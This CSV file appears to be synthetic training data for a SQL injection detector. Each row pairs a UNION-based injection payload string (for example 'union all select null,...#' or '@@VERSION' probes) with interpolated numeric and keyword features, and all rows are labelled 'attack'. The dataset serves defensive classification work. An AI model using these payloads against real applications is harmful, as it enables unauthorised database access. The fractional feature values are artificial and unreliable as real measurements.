id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000145,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,0.31328901682831745,64.53282800145712,22.23358599927144,3.8095691757237433,37.442760004857064,9.856481997328613,10.311447999028587,6.922138000242853,0.5783570034573354,0.1540745444102336,0.1603431134086798,0.10722533872375115,1.0,0.0,0.07786199975714658,0.0,0.0,1.0,0.0,0.0778619997571468,0.0,0.0,3.76641400072856,1.0778619997571466,1.0,0.0,0.0,1.0,0.0,1.0,0.0778619997571467,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,0.16310122083343803,69.06027352535695,21.060273525356944,3.3596707587005223,14.0,40.0,4.0,11.060273525356942,0.20272384485403788,0.579210985297251,0.0579210985297251,0.16014407131898606,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.060273525356943,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000147,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.5952612529060884,79.74432554187302,27.488651083746056,3.9845026059081468,40.0,3.0,23.511348916253944,13.232976625619086,0.5016181927729555,0.03762136445797165,0.29490323193627144,0.16585721083280133,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.744325541873029,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.9678819537540868,79.58427884756681,27.168557695133615,3.9565836853910548,40.0,3.0,23.831442304866385,12.752836542700422,0.5026311465343873,0.037697335990079045,0.2995374953948219,0.16013402208071176,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.584278847566807,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000149,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,1.7817513432280838,65.37067775319764,21.0,3.652171876073904,14.0,25.622406651918585,15.874135550639528,9.874135550639528,0.2191754021276393,0.3870867522188646,0.24383508042552787,0.14990276522796814,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.468533887659882,0.0,0.0,4.405601662979646,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000040,0.9144466168435981,58.33981650950932,23.679633019018635,3.914832351373728,25.601834904906827,12.737981604602489,15.320366980981365,4.679633019018635,0.4395241805110537,0.21763430288759805,0.26275400956889833,0.08008750703244989,1.0,0.0,0.3398165095093173,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3398165095093173,1.3398165095093173,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,0.11001624241056784,59.253834001447686,21.03172925018096,3.858649495697089,14.0,28.0,8.190375501085763,9.063458500361921,0.23638915354913545,0.47277830709827096,0.13792094170313143,0.15291159764946224,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0317292501809605,0.031729250180960344,0.0,5.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.16679652645683712,78.88461098573062,26.173083521404067,3.8710685825919824,40.0,3.0,24.769221971461242,11.115389014269379,0.5071081114887385,0.03803310836165538,0.3138655292999448,0.14099325084966144,3.0,0.0,2.0,0.0,1.0288472535673443,1.0,0.0,1.9423054928653112,0.0,0.0,0.9999999999999996,4.086541760702033,1.0,0.0,1.0,0.0,0.0,1.0,0.9711527464326555,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000153,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.8859337870890887,69.04631927629256,23.217594234020897,3.831109478055045,31.518492255665638,14.875044318564232,14.0,8.652782702062693,0.4665907792052448,0.20460910067019059,0.2040438504037697,0.12475626972079493,0.0,1.0,2.2175942340208974,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.4351884680417952,3.2175942340208974,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,2.0865927557270294,63.75858173065168,19.241418269348323,3.5003031739177852,26.873381409707818,13.42543669916858,14.0,9.459763621775279,0.4121987085302309,0.2194141612707715,0.22005868748981564,0.14832844270918202,0.0,1.0,0.5402363782247208,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.919527243550559,0.5402363782247208,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,1.1214686462729135,58.69778009645422,17.0,3.320280253114288,34.0,1.0,14.0,9.697780096454215,0.5792739557920972,0.0170374692880029,0.23852457003204003,0.16516400488785987,0.0,1.0,1.3955601929084303,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.0,1.39556019290843,0.0,1.0,0.6977800964542151,0.3022199035457849,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.7188573134026657,63.35121245663895,23.240798867578278,3.8679232380673576,31.147218118747563,10.68559207304794,14.0,7.518402264843445,0.48579172447795477,0.17357800680755192,0.222336921654836,0.11829334705965724,0.0,1.0,2.240798867578277,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.2776033972651684,3.2407988675782775,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.797972783279254,64.62280203785612,23.39348513204111,3.8606214962879934,31.852118943671123,11.164168226226105,14.0,7.60651486795889,0.48932762685088077,0.17622749989476577,0.21707261722393795,0.11737225603041547,1.0,0.0,1.803257433979445,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.60651486795889,2.8032574339794447,1.0,0.0,0.8032574339794448,0.19674256602055515,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000158,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.9600505939320624,79.3986701248872,21.40199481266919,3.606816335512764,49.39202074932324,7.405319500451178,13.40199481266919,9.199335062443602,0.62153963796325,0.09367591958300645,0.1689601825992257,0.11582425985451786,0.19933506244360277,0.0,0.0,0.0,0.0,0.8006649375563972,0.0,1.0,0.0,0.0,6.199335062443603,0.8006649375563972,0.19933506244360277,0.0,0.0,1.0,0.0,0.8006649375563972,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8006649375563972
SMOTE_000159,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,1.0451343447521375,59.1492354802758,18.703626037123158,3.6426715457422034,14.0,31.556487554522114,4.0,9.592747925753686,0.23923865698975988,0.5300206118711446,0.06835390199707425,0.1623868291420212,0.0,0.7036260371231572,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.8891218886305285,3.0,0.0,0.7036260371231572,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.25452206794356746,55.93784242089464,23.914741598100488,3.9350914462837054,20.364134430392205,15.40319118670341,14.0,6.170516803799027,0.3612144318662736,0.27773279243371163,0.2509284314345661,0.11012434426544863,0.0,1.0,2.914741598100487,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.25577520569853895,3.914741598100487,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,1.3102328629325188,58.72882263644121,15.72711773635588,3.131628342240879,44.18305810915297,1.0,4.0,9.545764527288242,0.7520672898760918,0.01711882504425291,0.06847530017701169,0.16233858490264358,1.0,0.0,0.5457645272882412,0.0,0.0,0.0,0.0,0.0,0.7271177363558792,0.0,6.545764527288242,0.5457645272882412,1.0,0.0,0.27288226364412066,0.7271177363558794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.7114813534734987,76.57545943886677,22.0,3.676569801776903,45.61454825078101,9.0,13.307274125390506,8.653637062695253,0.5958135770564676,0.11817348881211276,0.17316810589322593,0.11284482823819358,0.1731814686523735,0.0,0.0,0.0,0.0,1.0,0.0,0.8268185313476266,0.0,0.0,5.653637062695253,1.0,0.1731814686523735,0.0,0.0,1.0,0.0,1.0,0.8268185313476265,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.19047491807125674,56.15659072513539,24.185054516021662,3.9506504374759035,19.27758177403249,16.370109032043324,14.370109032043322,6.1387908870162455,0.34392994858959425,0.2913296693545947,0.255491756047838,0.109248626007973,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0462636290054153,0.0,0.0,0.09252725801083095,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,0.6926690961983241,76.63956664362689,22.0,3.6758889769285874,45.651180939215365,9.0,13.325590469607684,8.662795234803843,0.5957903918106231,0.11806112954378925,0.17327511472020068,0.11287336392538685,0.16860238259807864,0.0,0.0,0.0,0.0,1.0,0.0,0.8313976174019214,0.0,0.0,5.662795234803843,1.0,0.1686023825980787,0.0,0.0,1.0,0.0,1.0,0.8313976174019213,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.8253045226457563,62.10484895135427,18.0,3.5364139188636607,14.0,33.87097684564824,4.0,10.23387210570603,0.22621548663793245,0.5441795759168013,0.0646329961822664,0.16497194126299977,0.0,0.7661278942939701,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.467744211412059,3.0,0.0,0.7661278942939701,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.5064090679178657,62.509218217461616,20.509218217461616,3.7357974620303764,14.0,22.036872869846466,15.963127130153534,10.509218217461617,0.22398129671160708,0.3523045964109699,0.25564463752053507,0.16806946935688788,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.4907817825383836,0.5092182174616166,0.0,3.5092182174616164,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,0.46724658735133623,56.58538571225016,21.0,3.7481354168125818,14.0,21.561028566000424,12.829228575499682,8.195128570750052,0.24751955206673662,0.3800574713834808,0.22767596860062955,0.14474700794915304,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.804871429249947,0.0,0.0,3.390257141500106,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,0.29042537635260335,78.23649591224525,27.71783934595924,4.085462832063221,24.57675901893886,23.43567869191848,21.43567869191848,8.78837950946943,0.31482461902476766,0.299358725786271,0.2735571330191098,0.11225952216985163,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.92945983648981,0.0,0.0,1.8589196729796198,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.14694556069607564,74.89386551569231,32.0,4.394953372227387,44.0,2.0,17.0,11.893865515692314,0.5875196195999157,0.026705437254541636,0.22699621666360376,0.15877872648193897,0.0,0.0,2.0,0.0,1.946932757846157,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,6.893865515692314,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.162793183596122,62.21047085606912,17.49683766848553,3.339656933694494,43.216795519098056,1.0,8.745256502728294,9.248418834242765,0.6909485574380214,0.016487991433847216,0.1411046290353244,0.15145882209280706,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7515811657572353,0.0,5.496837668485529,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.6776406267401904,56.0,16.747682920209677,3.275254792635056,39.00926831916129,1.0,6.990731680838705,9.0,0.6965940771278802,0.017857142857142877,0.12483449430069116,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7476829202096763,1.0,0.0,5.252317079790323,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.7476829202096762,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,1.1355820728611903,63.28244270022447,24.35763359496633,3.8692732365137847,24.995419780314265,17.644656514876537,14.0,6.6423664050336715,0.38046843075182935,0.2907929372180275,0.22442518819928284,0.10431344383086028,0.7858778649887762,0.0,0.7858778649887763,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.070610675056119,1.7858778649887763,0.7858778649887763,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000173,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.5566063290483301,67.03929494164876,15.207858988329754,3.0407959064358514,50.0,1.0,4.831435953319009,11.207858988329752,0.7464863962692193,0.014929727925384384,0.07142927724124193,0.16715459856415435,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.2078589883297527,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.2078589883297527,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,0.010434001446736924,65.0098049565306,21.0,3.862960768208143,14.0,31.986926724625867,8.019609913061197,11.003268318843533,0.21535355896121533,0.49204445214744397,0.12334755762369527,0.1692544312676455,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.003268318843533,0.0032683188435328747,0.0,5.996731681156467,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000044,1.2339979570694277,57.66278999138625,18.68605004306875,3.4693902018345453,27.255799827724996,7.406990163661254,14.0,9.0,0.4713555748036652,0.12974671491257303,0.24280730191185496,0.15609040837190677,0.0,1.0,0.33721000861375017,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.66278999138625,0.33721000861374995,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.8484743649566544,62.54275659648874,16.591077712719454,3.2336204878532584,39.635689149122186,1.0,12.089222872805461,9.817844574561093,0.6396264488304242,0.016234435367934313,0.18667024506577282,0.15746887073586868,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8178445745610925,0.5910777127194538,0.0,5.4089222872805465,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.2641783796356481,70.87202324483255,16.0,3.131161869708429,41.73459370466648,1.0,17.3364842616662,10.80094527849986,0.590471154154803,0.014173731503830167,0.24306324455378303,0.15229186978758386,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8672968523332405,0.0,0.0,5.93364842616662,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
